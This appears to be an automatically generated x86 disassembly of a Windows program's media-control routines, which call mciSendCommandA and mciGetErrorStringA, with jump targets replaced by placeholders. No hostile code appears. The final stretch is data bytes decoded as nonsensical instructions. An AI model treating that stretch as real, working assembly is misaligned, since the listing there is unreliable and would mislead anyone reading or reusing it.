or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_482894
push ebx
push esi
push ecx
mov ebx eax
mov eax ebx
call sub_4820f0
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov eax ebx
call sub_456054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x855
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov esi eax
mov [ ebx + 0x304 ] esi
test esi esi
je r-xdata
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x1
jmp r-xdata
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax ebx
call sub_482538
jmp r-xdata
or [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2ef ] 0x0
pop edx
pop esi
pop ebx
retn
mov [ ebx + 0x2ee ] 0x0
sub_482948
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4820f0
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov esi [ ebx + 0x2e8 ]
mov eax ebx
call sub_4833b8
cmp al 0xa
jne r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
or esi 0x200
mov [ ebx + 0x2e8 ] esi
mov eax ebx
call sub_483334
cmp al 0x2
jne r-xdata
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax ebx
call sub_483378
call sub_4809a4
mov edi eax
and edi 0xff
mov eax ebx
call sub_4832ec
cmp edi eax
jne r-xdata
mov eax ebx
call sub_483378
call sub_4809a4
mov esi eax
and esi 0xff
mov eax ebx
call sub_4832ec
cmp esi eax
jne r-xdata
mov eax ebx
call sub_483378
call sub_4809a4
xor edx edx
mov dl al
inc edx
mov eax ebx
call sub_482f0c
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_4832ec
mov edx eax
mov eax ebx
call sub_482f0c
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_483378
call sub_4809a4
xor edx edx
mov dl al
inc edx
mov eax ebx
call sub_482f0c
mov edx eax
mov eax ebx
call sub_482f44
mov eax ebx
call sub_4832ec
mov edx eax
mov eax ebx
call sub_482f0c
mov edx eax
mov eax ebx
call sub_482f44
jmp r-xdata
mov eax ebx
call sub_456054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x807
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
or esi 0x8
mov [ ebx + 0x2e8 ] esi
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_482538
mov [ ebx + 0x2aa ] 0x0
jmp r-xdata
sub_482ad8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4820f0
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov ebp [ ebx + 0x2e8 ]
mov eax ebx
call sub_4833b8
cmp al 0xa
jne r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
or ebp 0x100
mov [ ebx + 0x2e8 ] ebp
mov eax ebx
call sub_483378
mov esi eax
mov eax ebx
call sub_483378
call sub_4809a4
xor edx edx
mov dl al
mov eax ebx
call sub_482f0c
mov edi eax
mov eax ebx
call sub_483334
cmp al 0x2
jne r-xdata
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax esi
call sub_4809a4
cmp al 0x1
je r-xdata
mov eax esi
call sub_4809a4
cmp al 0x1
je r-xdata
mov [ esp + 0x4 ] edi
mov eax esi
call sub_4809a8
push eax
mov eax edi
call sub_4809a8
pop edx
cmp dl al
jne r-xdata
mov edx edi
mov eax ebx
call sub_482f44
mov eax esi
call sub_4809a8
push eax
mov eax edi
call sub_4809a8
pop edx
cmp dl al
jne r-xdata
mov eax ebx
call sub_456054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x807
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax esi
call sub_4809b0
push eax
mov eax edi
call sub_4809b0
pop edx
cmp dl al
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4809b0
push eax
mov eax edi
call sub_4809b0
pop edx
cmp dl al
jne r-xdata
mov eax ebx
call sub_483378
call sub_4809a4
xor edx edx
mov dl al
dec edx
mov eax ebx
call sub_482f0c
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_483378
call sub_4809a4
xor edx edx
mov dl al
dec edx
mov eax ebx
call sub_482f0c
mov edx eax
mov eax ebx
call sub_482f44
jmp r-xdata
or ebp 0x8
mov [ ebx + 0x2e8 ] ebp
jmp r-xdata
mov eax ebx
call sub_482538
mov [ ebx + 0x2aa ] 0x0
jmp r-xdata
sub_482c94
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4820f0
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x31e ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_483378
mov esi eax
mov eax ebx
call sub_4832a4
cmp esi eax
jne r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_482ee0
or [ ebx + 0x2e8 ] 0x20000
mov eax [ ebx + 0x300 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_456054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80e
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_482d70
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4820f0
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebx
retn
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax [ ebx + 0x2e8 ]
or eax 0x20000
or eax 0x10000
mov [ ebx + 0x2e8 ] eax
mov eax [ ebx + 0x300 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_456054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80e
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_482e34
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_4820f0
cmp [ ebx + 0x2e5 ] 0x0
je r-xdata
add esp 0xc
pop ebx
retn
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x100
mov eax ebx
call sub_456054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80d
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_482ee0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4820f0
mov eax 0x102
mov edx esp
push edx
push eax
push 0x807
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
pop ecx
pop edx
pop ebx
retn
sub_482f0c
add esp 0xfffffff0
mov ecx 0x112
mov [ eax + 0x2e8 ] ecx
mov [ esp + 0x8 ] 0x2
mov [ esp + 0xc ] edx
mov edx esp
push edx
push ecx
push 0x814
movzx eax [ eax + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esp + 0x4 ]
add esp 0x10
retn
sub_482f6c
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov esi 0x401
mov [ ebx + 0x2e8 ] esi
xor eax eax
mov al dl
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push esi
push 0x80d
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
add esp 0xc
pop esi
pop ebx
retn
sub_482fa8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x30c ] esi
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x10002
mov eax esi
call sub_456054
mov [ esp + 0x4 ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x841
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov edi eax
mov [ ebx + 0x304 ] edi
test edi edi
je r-xdata
mov [ ebx + 0x30c ] esi
mov edx ebx
mov eax esi
call sub_421440
jmp r-xdata
xor eax eax
mov [ ebx + 0x30c ] eax
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_483030
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44ed24
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30c ]
jne r-xdata
cmp [ edi + 0x2e1 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x30c ] eax
mov eax edi
call sub_483070
sub_483070
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
mov esi 0x10002
mov [ ebx + 0x2e8 ] esi
xor eax eax
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push esi
push 0x841
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
sub_4830bc
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov ebx eax
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
mov esi 0x40000
mov [ ebx + 0x2e8 ] esi
mov eax esp
push eax
push esi
push 0x843
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_483110
push ebx
push esi
push edi
add esp 0xffffffd0
mov ebx eax
mov esi esp
mov eax 0x102
mov [ ebx + 0x2e8 ] eax
mov [ esi + 0x8 ] 0x8
push esi
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e3 ] al
test al al
je r-xdata
mov [ esi + 0x8 ] 0x1
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e6 ] al
test al al
je r-xdata
or [ ebx + 0x2e2 ] 0x4
mov [ esi + 0x8 ] 0x7
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e5 ] al
test al al
je r-xdata
or [ ebx + 0x2e2 ] 0x8
mov [ esi + 0x8 ] 0x3
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e7 ] al
test al al
je r-xdata
or [ ebx + 0x2e2 ] 0x2
mov [ esi + 0x8 ] 0x4
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
cmp eax 0x207
je r-xdata
or [ ebx + 0x2e2 ] 0x10
mov [ ebx + 0x2e4 ] 0x1
cmp eax 0x208
je r-xdata
mov esi 0x20000
mov [ ebx + 0x2e8 ] esi
lea eax [ esp + 0xc ]
push eax
push esi
push 0x843
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
lea esi [ esp + 0x10 ]
lea edi [ esp + 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ esp + 0x28 ]
sub eax [ esp + 0x20 ]
mov [ ebx + 0x310 ] eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x24 ]
mov [ ebx + 0x314 ] eax
add esp 0x30
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x2e2 ] 0x1
cmp eax 0x203
je r-xdata
cmp eax 0x201
jne r-xdata
cmp [ ebx + 0x2e4 ] 0x0
je r-xdata
sub_4832a4
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4820f0
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x1
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_4832ec
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4820f0
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x3
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_483334
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x4
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov al [ esp + 0x4 ]
sub al 0xc
add esp 0x10
pop esi
pop ebx
retn
sub_483378
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x2
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_4833b8
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4820f0
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x6
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov al [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_483400
push ebx
push esi
add esp 0xfffff004
push eax
mov esi edx
mov ebx eax
push 0x1000
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x304 ]
push eax
call mciGetErrorStringA
test eax eax
jne r-xdata
mov eax esp
call sub_408908
mov ecx eax
mov edx esp
mov eax esi
call sub_40419c
mov edx esi
mov eax [ rw-data ]
call sub_405e08
jmp r-xdata
add esp 0x1000
pop esi
pop ebx
retn
sub_483450
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_483475
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48347c
retn
sub_483518
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_48353d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483544
retn
sub_4837b4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x38
dec eax
add [ eax + edi + 0x48 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
cmp [ eax ] cl
dec eax
add [ eax ] al
add [ eax + 0x70 ] bl
inc ecx
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add al ah
push edx
dec eax
add [ eax - 0x17ffbe70 ] dl
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add ah dh
push ebx
dec eax
add al dl
pop ss
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
loopne r-xdata
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
lea eax [ eax ]
push esp
cmp [ eax ] cl
pop es
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
cld
aaa
dec eax
add [ ecx + esi * 2 + 0x41 ] dl
add [ edi ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x40109400
add [ eax + 0x54 ] bh
dec eax
add [ esp + edx * 2 + 0x10048 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x54
js r-xdata
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
pushfd
push edx
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] cl
dec edi
outsb
inc ebx
push 0x65676e61
lea eax [ eax ]
insb
cmp [ eax ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ ecx ] 0x48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x39aa0048 ] bl
dec eax
add [ eax ] cl
add [ eax ] al
pop eax
jo r-xdata
fsub [ esi + 0x41 ]
add [ eax ] dh
add [ eax ] al
[ eax + 0x1004854 ]
loopne r-xdata
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x5b ] dl
dec eax
add [ eax - 0x17ffbe70 ] dl
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ esi + edx + 0x17d00042 ] cl
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
add [ esp + ebx * 2 ] dh
dec eax
add [ esi ] cl
push esp
inc esp
push ebx
jb r-xdata
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
or al 0x5b
dec eax
add [ edx ] al
add bh ch
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0004 ] al
jb r-xdata
add ah ah
pop edx
dec eax
add al dl
pop ss
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
loopne r-xdata
arpl [ ebp + 0x74 ] si
dec ebp
popad
arpl [ edx + 0x6f ] si
nop
pushfd
cmp cl [ eax ]
add [ eax + 0x4f060002 ] al
outsb
dec edi
jo r-xdata
outsd
outsb
jbe r-xdata
push esp
inc esp
push ebx
jb r-xdata
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
outsb
cmp [ ebx + 0x41 ] bl
add [ eax ] bh
add [ eax ] al
add [ eax + 0x70 ] bl
inc ecx
inc eax
add al al
cmp [ eax ] ecx
pop es
push cs
push esp
inc esp
push ebx
jb r-xdata
xor [ eax ] al
add bh bh
and al 0x59
dec eax
add [ ecx ] al
jb r-xdata
outsb
inc ebp
js r-xdata
push cs
jb r-xdata
jbe r-xdata
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
pop es
dec edi
outsd
outsb
jbe r-xdata
cmp [ gs : bp + di + 0x41 ] bl
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
add [ ebx ] 0x0
insd
nop
call 0x7488323
push cs
push esp
inc esp
push ebx
jb r-xdata
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + ebx * 2 - 0x6f6fffb8 ] cl
inc ecx
add al ch
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
dec edi
add [ eax + eax ] 0xe
cmp [ eax ] ecx
push esp
jno r-xdata
rcl [ edi ] 0x1
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
loopne r-xdata
nop
add al 0x3c
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
add [ eax ] al
pop ebx
inc ecx
outsd
outsb
jbe r-xdata
add [ esp + edi ] dh
dec eax
add [ esp + edi + 0x48 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x3c ] al
fsub [ esi + 0x41 ]
add [ eax ] dh
add [ eax ] al
jmp [ ecx + ebx * 2 ]
add [ 0x656e694c ] al
jae r-xdata
jb r-xdata
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax + 0x4f070003 ] al
add [ 0x64440600 ] al
dec ebp
popad
outsb
add eax [ eax ]
cmp [ ebx + 0x41 ] bl
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
sbb al 0x42
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
sbb eax [ edx ]
inc eax
pop eax
dec eax
add [ ecx ] al
add bh ch
call eax
pop edx
dec eax
add [ esi ] cl
adc [ eax ] al
int3
add [ eax + 0x4f0a0006 ] al
add al 0x54
js r-xdata
add [ eax ] al
je r-xdata
dec eax
add [ eax + eax ] cl
add [ eax + 0x70 ] bl
inc ecx
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah bh
inc edx
dec eax
add [ eax - 0x17ffbe70 ] dl
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ esi + edx + 0x17d00042 ] cl
rcl [ esp + edi + 0x48 ] 0x0
pop es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c050004 ] al
imul ebp [ esi + 0x65 ] 0x415b3873
insd
pushfd
cmp cl [ eax ]
push esp
jno r-xdata
jno r-xdata
cmp al 0x48
add [ ecx + esi * 2 + 0x41 ] dl
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add [ edi ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x4839bc00
add [ eax + eax ] dh
add bh bh
mov esp 0x1004858
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0002 ] al
jb r-xdata
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x9004032 ] ah
inc ebp
inc esp
inc ebp
jb r-xdata
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
mov esp 0x483c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi + 0xc0048 ] bh
add [ eax ] al
push 0xe0004072
xor al 0x40
add ah ch
xor al 0x40
add al dh
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
aam 0x61
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
outsd
jb r-xdata
outsb
push eax
outsd
imul esp [ ebp + 0x44 ] 0x61
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ edx ] cl
dec edi
jb r-xdata
mov [ eax + ecx * 2 ] ds
nop
nop
jb r-xdata
pop es
push esp
inc esp
dec ebp
jb r-xdata
dec eax
add [ edi ] al
rcl [ edi + 0x48 ] 0x0
add [ eax ] al
add [ eax ] al
add [ ebp + edi + 0x48 ] al
add [ eax + 0x3d ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x3d ] dl
dec eax
add [ eax ] al
add [ eax ] al
pop eax
jo r-xdata
add [ eax + edx + 0x300040 ] dl
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
dec eax
pop esp
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
dec eax
add [ eax ] cl
add [ eax ] al
pop eax
jo r-xdata
je r-xdata
loopne r-xdata
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edx ] cl
dec eax
add [ eax - 0x17ffbe70 ] dl
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ esi + edx + 0x17d00042 ] cl
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
jb r-xdata
loopne r-xdata
inc ecx
add al ch
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add al ah
sbb al [ edx ]
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ esp + ebx * 2 - 0x6f6fffb8 ] cl
insd
nop
push 0x700483d
or al 0x54
inc esp
push ebx
jb r-xdata
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1400483e ] bh
add [ eax ] al
add ah cl
popad
outsd
outsb
jbe r-xdata
add [ esi + edx + 0x17d00042 ] cl
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
jb r-xdata
loopne r-xdata
sub al 0x3e
dec eax
add [ edi ] al
or al 0x54
inc esp
push ebx
jb r-xdata
in al dx
je r-xdata
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
inc edx
add ah ch
add [ eax ] al
